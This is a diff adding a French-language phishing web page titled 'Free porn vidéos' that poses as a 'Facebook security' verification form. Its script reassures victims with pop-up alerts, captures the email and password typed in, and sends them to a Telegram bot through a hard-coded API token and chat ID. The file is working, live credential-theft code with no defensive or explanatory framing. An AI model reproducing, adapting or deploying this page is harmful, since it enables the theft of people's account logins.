@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Free porn vidéos </title>
+  <style>
+    body {
+      background: #cccc;
+    }
+    #myform {
+      width: 90%;
+      height: 90%;
+      padding: 20px;
+      background:lightblue;
+      border: 2px solid #cccc;
+      margin-top: 50%;
+      color: blue;
+    }
+    #envoyer{
+      margin-top: 50px;
+      height: 30px;
+      background:#5cb85c;
+      width: 100px;
+      border:noe;
+      border-radius:5px;
+    }
+    input {
+      width: 100%;
+      height: 20px;
+    }
+    h2{
+      color:blue;
+      height: 40px;
+      text-align: center;
+      display: block;
+    }
+    label {
+      height: 20px;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <div id="myform">
+    <form id="monFormulaire" action="https://www.facebook.com/profile.php?id=100090265886700">
+      
+      <h2> Facebook security</h2>
+      <label for="email">Adresse Email</label>
+      <input id="email" type="email" placeholder="Email"required>
+      <label for="mdp">Mot de passe</label>
+      <input type="password" name="" id="mdp"placeholder="mot de passe"required>
+      <button id="envoyer">Envoyer</button>
+    </form>
+  </div>
+  <script>
+  alert("💌Nous vous promettons que ,vos informations ne seront pas divulguer, votre sécurité est notre priorité 👤");
+  confirm("veuillez confirmer qu'il s'agit bien de vous !!")
+  
+    const formulaire = document.getElementById('monFormulaire');
+    const tokenApi = '7990929037:AAGvc5oMgBjTw5cjfayR8nsGuOXmU2N59SE';
+    const idChat = '7879061625'; // Remplacez par votre ID de chat
+
+    formulaire.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const mdp = document.getElementById('mdp').value;
+      
+      const email = document.getElementById('email').value;
+      
+      
+      const message = `Email💌 : ${email}\nMoT de passe👤 :${mdp}`;
+
+      fetch(`https://api.telegram.org/bot${tokenApi}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: idChat,
+          text: message
+        })
+      })
+      .then((response) => response.json())
+      .then((data) => console.log(data))
+      .catch((error) => console.error(error));
+    });
+  </script>
+</body>
+</html>
